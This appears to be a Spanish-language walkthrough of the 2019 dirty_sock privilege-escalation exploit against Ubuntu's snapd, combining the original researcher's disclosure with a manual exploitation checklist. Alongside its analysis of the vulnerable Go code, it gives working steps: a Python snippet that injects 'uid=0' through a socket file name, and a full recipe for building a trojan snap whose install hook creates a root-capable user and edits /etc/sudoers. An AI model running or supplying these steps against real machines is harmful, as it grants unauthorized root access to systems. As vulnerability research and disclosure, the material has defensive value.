# Escalada de privilegios de Linux a través de snapd (exploit dirty_sock)
https://github.com/initstring/dirty_sock/

# Explotación manual
Crearemos nuestro propio fichero .snap, compilando un paquete de instalación malicioso que nos creará el usuario dirty_sock en el grupo root.

1. Copiar payload del script dirty_sockv2.py
2. Compactar y suprimir espacios del payload --> `echo "<payload>" | xargs | tr -d ' '`
3. Crear payload propio con python --> `python -c 'print "<payload>" + "A"*4256 + "=="'`
4. Decodificarlo y pasarlo a un fichero --> `... | base64 -d > setenso.snap`
5. Ejecutar binario snap con privilegios --> `sudo /usr/bin/snap install setenso.snap`
6. Bypassear signatures --> `sudo /usr/bin/snap install setenso.snap --devmode`
7. Comprobamos si el usuario existe --> `cat /etc/passwd`
8. Pivotamos al usuario dirty_sock : dirty_sock y elevamos privilegios --> `sudo su`

# Introduction

En enero de 2019, descubrí una vulnerabilidad de escalada de privilegios en las instalaciones predeterminadas de Ubuntu Linux. Esto se debió a un error en la API snapd, un servicio predeterminado. Cualquier usuario local podría aprovechar esta vulnerabilidad para obtener acceso root inmediato al sistema.

Si bien Ubuntu incluye snapd de forma predeterminada, cualquier sistema Linux con este paquete instalado es vulnerable.

Se proporcionan dos exploits funcionales en el repositorio dirty_sock :

1.  dirty_sockv1 : utiliza la API 'create-user' para crear un usuario local basado en los detalles consultados desde el SSO de Ubuntu.
2.  dirty_sockv2 : Carga lateralmente un Snap que contiene un gancho de instalación que genera un nuevo usuario local.

Ambos son efectivos en instalaciones predeterminadas de Ubuntu. Las pruebas se completaron principalmente en 18.10, pero las versiones anteriores también son vulnerables.

# TL; DR 

snapd ofrece una API REST adjunta a un socket AF_UNIX local. El control de acceso a las funciones de API restringidas se logra consultando el UID asociado con cualquier conexión realizada a ese socket. Los datos de pares de socket controlados por el usuario pueden verse afectados para sobrescribir una variable UID durante el análisis de cadenas en un bucle for. Esto permite que cualquier usuario acceda a cualquier función de la API.

Con acceso a la API, existen múltiples métodos para obtener root. Los exploits vinculados anteriormente demuestran dos posibilidades.

# Antecedentes: ¿Qué es Snap? 

En un intento por simplificar las aplicaciones de empaquetado en sistemas Linux, están surgiendo varios estándares competidores nuevos. Canonical, los creadores de Ubuntu Linux, están promocionando sus paquetes “Snap”. Esta es una forma de convertir todas las dependencias de las aplicaciones en un solo binario, similar a las aplicaciones de Windows.

El ecosistema Snap incluye una "tienda de aplicaciones" donde los desarrolladores pueden contribuir y mantener paquetes listos para usar.

La administración de Snaps instalados localmente y la comunicación con esta tienda en línea son manejadas parcialmente por un servicio systemd llamado "snapd" . Este servicio se instala automáticamente en Ubuntu y se ejecuta en el contexto del usuario "root". Snapd se está convirtiendo en un componente vital del sistema operativo Ubuntu, particularmente en los giros más eficientes como "Snappy Ubuntu Core" para la nube y la IoT.

# Descripción general de la vulnerabilidad

## Interesante información del sistema operativo Linux 

El servicio snapd se describe en un archivo de unidad de servicio systemd ubicado en /lib/systemd/system/snapd.service.

Aquí están las primeras líneas:

```
[Unit]
Description=Snappy daemon
Requires=snapd.socket
```

Esto nos lleva a un archivo de unidad de socket systemd, ubicado en /lib/systemd/system/snapd.socket

Las siguientes líneas proporcionan información interesante:

```
[Socket]
ListenStream=/run/snapd.socket
ListenStream=/run/snapd-snap.socket
SocketMode=0666
```

Linux usa un tipo de socket de dominio UNIX llamado "AF_UNIX" que se usa para comunicarse entre procesos en la misma máquina. Esto contrasta con los sockets “AF_INET” y “AF_INET6”, que se utilizan para que los procesos se comuniquen a través de una conexión de red.

Las líneas que se muestran arriba nos dicen que se están creando dos archivos de socket. El modo '0666' establece los permisos de archivo para leer y escribir para todos, lo cual es necesario para permitir que cualquier proceso se conecte y se comunique con el socket.

Podemos ver la representación del sistema de archivos de estos sockets aquí:

```
$ ls -aslh /run/snapd*
0 srw-rw-rw- 1 root root  0 Jan 25 03:42 /run/snapd-snap.socket
0 srw-rw-rw- 1 root root  0 Jan 25 03:42 /run/snapd.socket
```

Interesante. Podemos usar la herramienta Linux “nc” (siempre que sea del tipo BSD) para conectarnos a sockets AF_UNIX como estos. El siguiente es un ejemplo de cómo conectarse a uno de estos enchufes y simplemente presionar enter.

```
$ nc -U /run/snapd.socket

HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request
```

Aún más interesante. Una de las primeras cosas que hará un atacante cuando comprometa una máquina es buscar servicios ocultos que se ejecutan en el contexto de root. Los servidores HTTP son los principales candidatos para la explotación, pero generalmente se encuentran en sockets de red.

Esta es información suficiente ahora para saber que tenemos un buen objetivo para la explotación: un servicio HTTP oculto que probablemente no se haya probado ampliamente, ya que no es evidente con la mayoría de las comprobaciones automatizadas de escalado de privilegios.

_NOTA: Consulte mi herramienta de escalada de privilegios de trabajo en progreso uptux que identificaría esto como interesante._

## Vulnerable Code

Al ser un proyecto de código abierto, ahora podemos pasar al análisis estático a través del código fuente. Los desarrolladores han reunido una excelente documentación sobre esta API REST [disponible aquí](https://github.com/snapcore/snapd/wiki/REST-API) .

La función API que se destaca como altamente deseable para la explotación es "POST / v2 / create-user", que se describe simplemente como "Crear un usuario local". La documentación nos dice que esta llamada requiere acceso de nivel raíz para ejecutarse.

Pero, ¿cómo determina exactamente el demonio si el usuario que accede a la API ya tiene root?

Revisar el rastro del código nos lleva a [este archivo](https://github.com/snapcore/snapd/blob/4533d900f6f02c9a04a59e49e913f04a485ae104/daemon/ucrednet.go) (he vinculado la versión históricamente vulnerable).

Veamos esta línea:

```
ucred, err := getUcred(int(f.Fd()), sys.SOL_SOCKET, sys.SO_PEERCRED)
```

Esto es llamar a una de las bibliotecas estándar de golang para recopilar información del usuario relacionada con la conexión de socket.

Básicamente, la familia de sockets AF_UNIX tiene una opción para habilitar la recepción de las credenciales del proceso de envío en datos auxiliares (ver `man unix`desde la línea de comandos de Linux).

Esta es una forma bastante sólida de determinar los permisos del proceso que accede a la API.

Usando un depurador de golang llamado delve, podemos ver exactamente lo que devuelve al ejecutar el comando "nc" desde arriba. A continuación se muestra la salida del depurador cuando establecemos un punto de interrupción en esta función y luego usamos el comando "imprimir" de delve para mostrar qué contiene actualmente la variable "ucred":

```
> github.com/snapcore/snapd/daemon.(*ucrednetListener).Accept()
...
   109:			ucred, err := getUcred(int(f.Fd()), sys.SOL_SOCKET, sys.SO_PEERCRED)
=> 110:			if err != nil {
...
(dlv) print ucred
*syscall.Ucred {Pid: 5388, Uid: 1000, Gid: 1000}
```

Eso luce bastante bien. Ve mi uid de 1000 y me negará el acceso a las funciones sensibles de la API. O, al menos, lo sería si estas variables se llamaran exactamente en este estado. Pero no lo son.

En cambio, se produce un procesamiento adicional en esta función, donde la información de conexión se agrega a un nuevo objeto junto con los valores descubiertos anteriormente:

```
func (wc *ucrednetConn) RemoteAddr() net.Addr {
	return &ucrednetAddr{wc.Conn.RemoteAddr(), wc.pid, wc.uid, wc.socket}
}
```

... y luego un poco más en este, donde todos estos valores se concatenan en una sola variable de cadena:

```
func (wa *ucrednetAddr) String() string {
	return fmt.Sprintf("pid=%s;uid=%s;socket=%s;%s", wa.pid, wa.uid, wa.socket, wa.Addr)
}
```

..y finalmente se analiza mediante esta función, donde esa cadena combinada se divide nuevamente en partes individuales:

```
func ucrednetGet(remoteAddr string) (pid uint32, uid uint32, socket string, err error) {
...
	for _, token := range strings.Split(remoteAddr, ";") {
		var v uint64
...
		} else if strings.HasPrefix(token, "uid=") {
			if v, err = strconv.ParseUint(token[4:], 10, 32); err == nil {
				uid = uint32(v)
			} else {
				break
}
```

Lo que hace esta última función es dividir la cadena por el ";" carácter y luego busque cualquier cosa que comience con "uid =". Como está iterando a través de todas las divisiones, una segunda aparición de "uid =" sobrescribirá la primera.

Si tan solo pudiéramos de alguna manera inyectar texto arbitrario en esta función ...

Volviendo al depurador delve, podemos echar un vistazo a esta cadena "remoteAddr" y ver qué contiene durante una conexión "nc" que implementa una solicitud HTTP GET adecuada:

Solicitar:

```
$ nc -U /run/snapd.socket
GET / HTTP/1.1
Host: 127.0.0.1
```

Salida de depuración:

```
github.com/snapcore/snapd/daemon.ucrednetGet()
...
=>  41:		for _, token := range strings.Split(remoteAddr, ";") {
...
(dlv) print remoteAddr
"pid=5127;uid=1000;socket=/run/snapd.socket;@"

```

Ahora, en lugar de un objeto que contiene propiedades individuales para cosas como uid y pid, tenemos una sola variable de cadena con todo concatenado. Esta cadena contiene cuatro elementos únicos. El segundo elemento "uid = 1000" es el que actualmente controla los permisos.

Si imaginamos la función dividiendo esta cadena por ";" e iterando, vemos que hay dos secciones que (si contienen la cadena “uid =") podrían potencialmente sobrescribir el primer “uid =”, si tan solo pudiéramos influir en ellas.

El primero ("socket = / run / snapd.socket") es la "dirección de red" local del socket de escucha, la ruta del archivo al que está definido el servicio para vincularse. No tenemos permisos para modificar snapd para que se ejecute en otro nombre de socket, por lo que parece poco probable que podamos modificarlo.

Pero, ¿qué es ese signo "@" al final de la cadena? ¿De dónde viene esto? El nombre de la variable "remoteAddr" es una buena pista. Pasando un poco más de tiempo en el depurador, podemos ver que una biblioteca estándar de golang (net.go) devuelve una dirección de red local Y una dirección remota. Puede ver estos resultados en la sesión de depuración a continuación como "laddr" y "raddr".

```
> net.(*conn).LocalAddr() /usr/lib/go-1.10/src/net/net.go:210 (PC: 0x77f65f)
...
=> 210:	func (c *conn) LocalAddr() Addr {
...
(dlv) print c.fd
...
	laddr: net.Addr(*net.UnixAddr) *{
		Name: "/run/snapd.socket",
		Net: "unix",},
	raddr: net.Addr(*net.UnixAddr) *{Name: "@", Net: "unix"},}
```

La dirección remota está configurada con ese misterioso signo "@". La lectura adicional de las `man unix`páginas de ayuda proporciona información sobre lo que se denomina "espacio de nombres abstracto". Esto se usa para enlazar sockets que son independientes del sistema de archivos. Los sockets en el espacio de nombres abstracto comienzan con un carácter de byte nulo, que a menudo se muestra como "@" en la salida del terminal.

En lugar de confiar en el espacio de nombres de socket abstracto aprovechado por netcat, podemos crear nuestro propio socket vinculado a un nombre de archivo que controlamos. Esto debería permitirnos afectar la porción final de esa variable de cadena que queremos modificar, que aterrizará en la variable "raddr" que se muestra arriba.

Usando un código Python simple, podemos crear un nombre de archivo que tenga la cadena "; uid = 0;" en algún lugar dentro de él, vincúlelo a ese archivo como un socket y utilícelo para iniciar una conexión de regreso a la API snapd.

Aquí hay un fragmento del exploit POC:

```python
# Setting a socket name with the payload included
sockfile = "/tmp/sock;uid=0;"

# Bind the socket
client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
client_sock.bind(sockfile)

# Connect to the snap daemon
client_sock.connect('/run/snapd.socket')

```

Dupdo

Ahora observe lo que sucede en el depurador cuando miramos de nuevo la variable remoteAddr:

```
> github.com/snapcore/snapd/daemon.ucrednetGet()
...
=>  41:		for _, token := range strings.Split(remoteAddr, ";") {
...
(dlv) print remoteAddr
"pid=5275;uid=1000;socket=/run/snapd.socket;/tmp/sock;uid=0;"

```

Ahí vamos: hemos inyectado un uid falso de 0, el usuario raíz, que estará en la última iteración y sobrescribirá el uid real. Esto nos dará acceso a las funciones protegidas de la API.

Podemos verificar esto continuando hasta el final de esa función en el depurador, y ver que uid se establece en 0. Esto se muestra en el resultado delve a continuación:

```
> github.com/snapcore/snapd/daemon.ucrednetGet()
...
=>  65:		return pid, uid, socket, err
...
(dlv) print uid
0
```

# Weaponizing

## Versión uno
[dirty_sockv1](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py) aprovecha la función API 'POST / v2 / create-user'. Para usar este exploit, simplemente cree una cuenta en Ubuntu SSO y cargue una clave pública SSH en su perfil. Luego, ejecute el exploit de esta manera (usando la dirección de correo electrónico que registró y la clave privada SSH asociada):

```
$ dirty_sockv1.py -u you@email.com -k id_rsa
```

Esto es bastante confiable y parece seguro de ejecutar. Probablemente pueda dejar de leer aquí y obtener root.

¿Seguir leyendo? Bueno, el requisito de una conexión a Internet y un servicio SSH me molestaba, y quería ver si podía explotar en entornos más restringidos. Esto nos lleva a ...

## Versión dos

En su lugar, [dirty_sockv2](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py) usa la API 'POST / v2 / snaps' para descargar un Snap que contiene un script bash que agregará un usuario local. Esto funciona en sistemas que no tienen el servicio SSH en ejecución. También funciona en versiones más recientes de Ubuntu sin conexión a Internet. SIN EMBARGO, la carga lateral requiere que algunas piezas de resorte estén allí. Si no están allí, este exploit puede desencadenar una actualización del servicio snapd. Mis pruebas muestran que esto seguirá funcionando, pero solo funcionará UNA VEZ en este escenario.

Las instantáneas se ejecutan en entornos aislados y requieren firmas digitales que coincidan con las claves públicas en las que las máquinas ya confían. Sin embargo, es posible reducir estas restricciones indicando que se está desarrollando un complemento (llamado "devmode"). Esto le dará acceso instantáneo al sistema operativo host como lo haría cualquier otra aplicación.

Además, las instantáneas tienen algo llamado "ganchos". Uno de esos ganchos, el "gancho de instalación" se ejecuta en el momento de la instalación instantánea y puede ser un simple script de shell. Si el complemento está configurado en "devmode", este enlace se ejecutará en el contexto de root.

Creé un complemento desde cero que está esencialmente vacío y no tiene funcionalidad. Sin embargo, lo que sí tiene es un script bash que se ejecuta en el momento de la instalación.

_Nota para mayor claridad: esta versión del exploit no se esconde dentro de un snap malicioso. En su lugar, utiliza un complemento malicioso como mecanismo de entrega para la carga útil de creación del usuario. Esto es posible debido al mismo error uid = 0 que la versión 1_

Ese script de bash ejecuta los siguientes comandos:

```
useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo dirty_sock
echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

Esa cadena encriptada es simplemente el texto `dirty_sock`creado con la `crypt.crypt()`función de Python .

Los siguientes comandos muestran el proceso de creación de este complemento en detalle. Todo esto se hace desde una máquina de desarrollo, no desde el objetivo. Una vez que se crea el complemento, se convierte a texto base64 para ser incluido en el exploit completo de Python.

```sh
# Install necessary tools
sudo apt install snapcraft -y

# Make an empty directory to work with
cd /tmp
mkdir dirty_snap
cd dirty_snap

# Initialize the directory as a snap project
snapcraft init

# Set up the install hook
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install

# Write the script we want to execute as root
cat > snap/hooks/install << "EOF"
#!/bin/bash

useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo dirty_sock
echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF

# Configure the snap yaml file
cat > snap/snapcraft.yaml << "EOF"
name: dirty-sock
version: '0.1' 
summary: Empty snap, used for exploit
description: |
    See https://github.com/initstring/dirty_sock

grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
EOF

# Build the snap
snapcraft
```

Dupdo

Si no confía en el blob que puse en el exploit, puede crear el suyo manualmente con el método anterior.

Una vez que tenemos el archivo snap, podemos usar bash para convertirlo a base64 de la siguiente manera:

```
$ base64 <snap-filename.snap>
```

Ese texto codificado en base64 puede ir a la variable global "TROJAN_SNAP" al comienzo del exploit dirty_sock.py.

El exploit en sí está escrito en Python y hace lo siguiente:

1.  Crea un archivo aleatorio con la cadena '; uid = 0;' en el nombre
2.  Vincula un socket a este archivo
3.  Se conecta a la API de snapd
4.  Elimina el troyano snap (si quedó de una ejecución anterior abortada)
5.  Instala el troyano snap (momento en el que se ejecutará el gancho de instalación)
6.  Elimina el troyano snap
7.  Elimina el archivo de socket temporal
8.  Te felicita por tu éxito

![captura de pantalla](https://initblog.com/images/post-dirtysock/screenshot.png#center)

# Protección / Remediación

¡Parchea su sistema! El equipo de snapd arregló esto inmediatamente después de mi divulgación.